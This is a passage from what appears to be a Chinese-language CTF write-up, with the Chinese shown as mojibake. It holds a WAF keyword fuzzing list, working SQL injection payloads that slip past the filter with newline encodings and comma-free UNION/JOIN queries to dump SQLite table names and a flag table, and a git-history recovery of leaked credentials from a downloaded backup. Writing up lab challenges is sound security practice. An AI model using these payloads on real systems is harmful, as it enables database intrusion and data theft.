class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">1    length    </span><br><span class="line">2    Length     </span><br><span class="line">3    +    </span><br><span class="line">4    handler        </span><br><span class="line">5    like    </span><br><span class="line">6    LiKe       </span><br><span class="line">7    select        </span><br><span class="line">8    SeleCT       </span><br><span class="line">9    sleep    </span><br><span class="line">10    SLEEp   </span><br><span class="line">11    database    </span><br><span class="line">12    DATABASe       </span><br><span class="line">13    delete     </span><br><span class="line">14    having        </span><br><span class="line">15    or    </span><br><span class="line">16    oR     </span><br><span class="line">17    as    </span><br><span class="line">18    As    </span><br><span class="line">19    -~   </span><br><span class="line">20    BENCHMARK      </span><br><span class="line">21    limit      </span><br><span class="line">22    LimIt   </span><br><span class="line">23    left      </span><br><span class="line">24    Left       </span><br><span class="line">25    select   </span><br><span class="line">26    SELECT   </span><br><span class="line">27    insert   </span><br><span class="line">28    insERT   </span><br><span class="line">29    INSERT    </span><br><span class="line">30    right     </span><br><span class="line">33    INFORMATION    </span><br><span class="line">36    !       </span><br><span class="line">37    %        </span><br><span class="line">38    +       </span><br><span class="line">39    xor       </span><br><span class="line">40    &lt;&gt;   </span><br><span class="line">41    (       </span><br><span class="line">42    &gt;   </span><br><span class="line">43    &lt;   </span><br><span class="line">44    )    </span><br><span class="line">45    .     </span><br><span class="line">46    ^        </span><br><span class="line">48    AND        </span><br><span class="line">49    ANd    </span><br><span class="line">50    BY   </span><br><span class="line">51    By    </span><br><span class="line">52    CAST      </span><br><span class="line">53    COLUMN  </span><br><span class="line">54    COlumn        </span><br><span class="line">55    COUNT       </span><br><span class="line">56    Count      </span><br><span class="line">57    CREATE      </span><br><span class="line">58    END     </span><br><span class="line">59    case     </span><br><span class="line">61    when    </span><br><span class="line">65    +    </span><br><span class="line">66    REVERSE   </span><br><span class="line">67    ascii       </span><br><span class="line">68    ASSIC    </span><br><span class="line">69    ASSic    </span><br><span class="line">71    database   </span><br><span class="line">72    left     </span><br><span class="line">73    right    </span><br><span class="line">74    union    </span><br><span class="line">75    UNIon    </span><br><span class="line">76    UNION     </span><br><span class="line">79    &amp;     </span><br><span class="line">80    &amp;&amp;      </span><br><span class="line">81    ||     </span><br><span class="line">82    oorr     </span><br><span class="line">88    anandd      </span><br><span class="line">89    GROUP   </span><br><span class="line">90    HAVING      </span><br><span class="line">91    IF       </span><br><span class="line">92    INTO      </span><br><span class="line">93    JOIN        </span><br><span class="line">94    LEAVE      </span><br><span class="line">95    LEFT    </span><br><span class="line">96    LEVEL       </span><br><span class="line">97    sleep    </span><br><span class="line">98    LIKE     </span><br><span class="line">99    NAMES      </span><br><span class="line">100    NEXT     </span><br><span class="line">102    OF        </span><br><span class="line">103    ON       </span><br><span class="line">104    |   </span><br><span class="line">105    infromation_schema      </span><br><span class="line">106    user     </span><br><span class="line">107    OR     </span><br><span class="line">108    ORDER       </span><br><span class="line">109    ORD   </span><br><span class="line">110    SCHEMA        </span><br><span class="line">111    SELECT       </span><br><span class="line">112    SET      </span><br><span class="line">113    TABLE      </span><br><span class="line">114    THEN     </span><br><span class="line">115    UNION        </span><br><span class="line">116    UPDATE       </span><br><span class="line">117    USER      </span><br><span class="line">118    USING      </span><br><span class="line">119    VALUE       </span><br><span class="line">120    VALUES       </span><br><span class="line">121    WHEN      </span><br><span class="line">122    WHERE       </span><br><span class="line">123    ADD       </span><br><span class="line">124    AND       </span><br><span class="line">125    prepare        </span><br><span class="line">126    set      </span><br><span class="line">127    update     </span><br><span class="line">128    delete        </span><br><span class="line">129    drop        </span><br><span class="line">130    inset        </span><br><span class="line">131    CAST        </span><br><span class="line">132    COLUMN      </span><br><span class="line">133    CONCAT      </span><br><span class="line">134    GROUP_CONCAT       </span><br><span class="line">135    group_concat       </span><br><span class="line">136    CREATE        </span><br><span class="line">137    DATABASE      </span><br><span class="line">138    DATABASES    </span><br><span class="line">139    alter     </span><br><span class="line">140    DELETE        </span><br><span class="line">141    DROP     </span><br><span class="line">142    floor      </span><br><span class="line">143    join     </span><br><span class="line">144    rand()        </span><br><span class="line">148    rand(       </span><br><span class="line">149    information_schema.tables        </span><br><span class="line">150    TABLE_SCHEMA    </span><br><span class="line">151    %df    </span><br><span class="line">152    concat_ws()    </span><br><span class="line">153    concat   </span><br><span class="line">157    LIMIT       </span><br><span class="line">158    ORD    </span><br><span class="line">159    ON     </span><br><span class="line">160    extractvalue        </span><br><span class="line">161    order        </span><br><span class="line">162    CAST()      </span><br><span class="line">163    by       </span><br><span class="line">164    ORDER        </span><br><span class="line">165    OUTFILE        </span><br><span class="line">166    RENAME       </span><br><span class="line">167    REPLACE        </span><br><span class="line">168    SCHEMA       </span><br><span class="line">169    SELECT       </span><br><span class="line">170    SET    </span><br><span class="line">171    updatexml      </span><br><span class="line">172    SHOW       </span><br><span class="line">173    SQL   </span><br><span class="line">174    TABLE   </span><br><span class="line">175    THEN  </span><br><span class="line">177    instr    </span><br><span class="line">178    benchmark   </span><br><span class="line">179    format        </span><br><span class="line">180    bin    </span><br><span class="line">181    substring       </span><br><span class="line">182    ord        </span><br><span class="line">183    UPDATE       </span><br><span class="line">184    VALUES    </span><br><span class="line">185    VARCHAR       </span><br><span class="line">186    VERSION       </span><br><span class="line">187    WHEN        </span><br><span class="line">188    WHERE        </span><br><span class="line">190    `       </span><br><span class="line">193    users      </span><br><span class="line">194    %0a      </span><br><span class="line">195    %0A        </span><br><span class="line">196    %0b        </span><br><span class="line">197    mid        </span><br><span class="line">198    for        </span><br><span class="line">199    BEFORE        </span><br><span class="line">200    REGEXP        </span><br><span class="line">201    RLIKE      </span><br><span class="line">202    in       </span><br><span class="line">204    SEPARATOR        </span><br><span class="line">205    XOR        </span><br><span class="line">206    CURSOR        </span><br><span class="line">207    FLOOR        </span><br><span class="line">208    sys.schema_table_statistics_with_buffer        </span><br><span class="line">209    INFILE        </span><br><span class="line">210    count        </span><br><span class="line">211    %0c        </span><br><span class="line">212    from        </span><br><span class="line">213    %0d      </span><br><span class="line">214    %a0        </span><br><span class="line">216    @        </span><br><span class="line">217    else  </span><br></pre></td></tr></table></figure><br/><p>403çš„æ˜¯:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">31    #       </span><br><span class="line">32    --+      </span><br><span class="line">34    --       </span><br><span class="line">35    ;       </span><br><span class="line">47    =       </span><br><span class="line">60    &#x27;1&#x27;=&#x27;1        </span><br><span class="line">62    admin&#x27;       </span><br><span class="line">63    &quot;       </span><br><span class="line">64    length        </span><br><span class="line">70    select         </span><br><span class="line">77    &quot;        </span><br><span class="line">78    &#x27;      </span><br><span class="line">83    /        </span><br><span class="line">84    //        </span><br><span class="line">85    //*        </span><br><span class="line">86    */*        </span><br><span class="line">87    /**/        </span><br><span class="line">145    substr(        </span><br><span class="line">146    substring(        </span><br><span class="line">147    mid(        </span><br><span class="line">154    char(        </span><br><span class="line">155    hex(        </span><br><span class="line">156    ascii(        </span><br><span class="line">189    /*       </span><br><span class="line">191             </span><br><span class="line">192    ,    </span><br><span class="line">203    sys schemma        </span><br><span class="line">215    =        </span><br><span class="line">218    %27    </span><br><span class="line">219    %23        </span><br><span class="line">220    %22       </span><br><span class="line">221    %20    </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä»¥ä¸‹çš„è¡¨æ§‹é€ payload:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1%0AORdeR%0ABy%0A1</span><br><span class="line">1%0AORdeR%0ABy%0A10</span><br><span class="line">1</span><br><span class="line">ORdeR</span><br><span class="line">By</span><br><span class="line">10</span><br></pre></td></tr></table></figure><img src="5c86363ff2ee4e023fd44027e77e160b.png" alt="5c86363ff2ee4e023fd44027e77e160b.png"  /><p>å¯ä»¥çœ‹è¦‹æœ‰5åˆ— , ç”¨id&#x3D;-1%0aORDER%0aBY%0a5 æ¸¬è©¦äº†ä¸€ä¸‹æ˜¯å¯ä»¥çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=-1</span><br><span class="line">ORDER</span><br><span class="line">BY</span><br><span class="line">5</span><br></pre></td></tr></table></figure><img src="3473398aa359f766e196f8de9b33181c.png" alt="3473398aa359f766e196f8de9b33181c.png"  /><p>è¦æ§‹é€  UNION SELECT èªå¥</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-1</span><br><span class="line">UNION</span><br><span class="line">SELECT</span><br><span class="line">*</span><br><span class="line">from</span><br><span class="line">(SELECT</span><br><span class="line">NULL)a</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)b</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)c</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)d</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)e</span><br></pre></td></tr></table></figure><p>URLç·¨ç¢¼ä¸€ä¸‹: -1%0aUNION%0aSELECT%0a*%0afrom%0a(SELECT%0aNULL)a%0aJOIN%0a(SELECT%0agroup_concat(name)%0afrom%0asqlite_master%0aWHERE%0atype%0aLIKE%0a0x7461626c65)b%0aJOIN%0a(SELECT%0aNULL)c%0aJOIN%0a(SELECT%0aNULL)d%0aJOIN%0a(SELECT%0aNULL)e</p><p>è©¦ä¸€è©¦:</p><p>-1 UNION SELECT * from (SELECT NULL)a </p><p>JOIN (SELECT group_concat(name) from sqlite_master)b </p><p>JOIN(SELECT NULL)c</p><p>JOIN(SELECT NULL)d</p><p>JOIN(SETECT NULL)e</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-1</span><br><span class="line">UNION</span><br><span class="line">SELECT</span><br><span class="line">*</span><br><span class="line">from</span><br><span class="line">(SELECT</span><br><span class="line">NULL)a</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">group_concat(name)</span><br><span class="line">from</span><br><span class="line">sqlite_master)b</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)c</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)d</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)e</span><br></pre></td></tr></table></figure><p>-1%0aUNION%0aSELECT%0a*%0afrom%0a(SELECT%0aNULL)a%0aJOIN%0a(SELECT%0agroup_concat(name)%0afrom%0asqlite_master)b%0aJOIN%0a(SELECT%0aNULL)c%0aJOIN%0a(SELECT%0aNULL)d%0aJOIN%0a(SELECT%0aNULL)e</p><br/><p>â€œnode_status,sys_config,sqlite_autoindex_sys_config_1,sqlite_sequenceâ€</p><br/><p>-1 UNION SELECT * from (SELECT  group_concat(name) from sqlite_master)a </p><p>JOIN (SELECT NULL)b </p><p>JOIN(SELECT NULL)c</p><p>JOIN(SELECT NULL)d</p><p>JOIN(SETECT NULL)e</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1  select * from(SELECT *, floor(1+rand(5)*500000) as a FROM `flag`)t WHERE a = 1</span><br></pre></td></tr></table></figure><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="1-å°Eçš„ç§˜å¯†è®¡åˆ’"><a href="#1-å°Eçš„ç§˜å¯†è®¡åˆ’" class="headerlink" title="1.å°Eçš„ç§˜å¯†è®¡åˆ’"></a>1.å°Eçš„ç§˜å¯†è®¡åˆ’</h2><p><a href="http://www.zip/">www.zip</a> ç‚ºå‚™ä»½æ–‡ä»¶ , url&#x2F;ww.zipä¸‹è¼‰ , </p><img src="361fd33e57cceeae07f915f9e74450d6.png" alt="361fd33e57cceeae07f915f9e74450d6.png"  /><p>çœ‹ä»¥çœ‹è¦‹index.htmlæ˜¯<a href="https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/">https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/</a></p><p>é€²å…¥public-555edc76-9621-4997-86b9-01483a50293e , æœ‰ä¸€å€‹login.php , </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="variable">$userData</span> = <span class="title function_ invoke__">getUserData</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="variable">$userData</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$password</span> === <span class="variable">$userData</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /secret-xxxxxxxxxxxxxxxxxxx&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ç™»å½•å¤±è´¥,åœ¨gité‡Œæ‰¾æ‰¾å§&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨git bashé€²è¡Œæ§åˆ¶</p><p>git bash</p><p>ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶</p><p>æŸ¥çœ‹æäº¤å†å²ï¼š</p><p>git log â€“oneline</p><img src="cedc26f5a288a6a307272f8d41f67e79.png" alt="cedc26f5a288a6a307272f8d41f67e79.png"  /><p>$ git diff â€“name-status 1389b47 5f8ecc0<br>A tips.txt</p><br/><p>$ git checkout 353b98f7c2fe77a5a426bf73576f5113820c4669</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Note: switching to &#x27;353b98f7c2fe77a5a426bf73576f5113820c4669&#x27;.</span><br><span class="line">You are in &#x27;detached HEAD&#x27; state. You can look around, make experimental</span><br><span class="line">changes and commit them, and you can discard any commits you make in this</span><br><span class="line">state without impacting any branches by switching back to a branch.</span><br><span class="line">If you want to create a new branch to retain commits you create, you may</span><br><span class="line">do so (now or later) by using -c with the switch command. Example:</span><br><span class="line">git switch -c &lt;new-branch-name&gt;</span><br><span class="line">Or undo this operation with:</span><br><span class="line">git switch -</span><br><span class="line">Turn off this advice by setting config variable advice.detachedHead to false</span><br><span class="line">HEAD is now at 353b98f æµ‹è¯•ï¼Œè¿™ä¸ªbranchä¼šåˆ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$ git diff 1389b4798a8013a1c90fb2d867243d0da18c5175â€¦353b98f7c2fe77a5a426bf73576f5113820c4669 â€“name-status</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A user.php</span><br></pre></td></tr></table></figure><br/><p>$ cat user.php</p><img src="e225b0ab18591072357866366f4cfc31.png" alt="e225b0ab18591072357866366f4cfc31.png"  /><br/><p>$ git switch master</p><br/><p>æ›å›master mode </p><br/><p>$ cat index.html</p><br/><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Project X - ç™»å½•ç³»ç»Ÿ<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../css/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;floating-shapes&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;floating-shape shape-circle&quot;</span> <span class="attr">style</span>=<span class="string">&quot;top: 15%; left: 10%;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;floating-shape shape-ring&quot;</span> <span class="attr">style</span>=<span class="string">&quot;top: 40%; left: 85%;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;floating-shape shape-polygon&quot;</span> <span class="attr">style</span>=<span class="string">&quot;top: 70%; left: 20%;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-box&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-logo&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>PROJECT X<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>ç³»ç»Ÿè®¿é—®è®¤è¯<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>tips: é»˜è®¤å¯†ç ä½¿ç”¨uuid4ç”Ÿæˆï¼Œä¸å¯èƒ½è¢«çˆ†ç ´<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login-form&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>ç”¨æˆ·ID<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¾“å…¥æ‚¨çš„ç”¨æˆ·ID&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>å¯†ç <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¾“å…¥æ‚¨çš„å¯†ç &quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-actions&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>è¿”å›é¦–é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">id</span>=<span class="string">&quot;login-btn&quot;</span>&gt;</span>éªŒè¯ç™»å½•<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-footer&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>ç‰ˆæœ¬ 5.1.4<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable 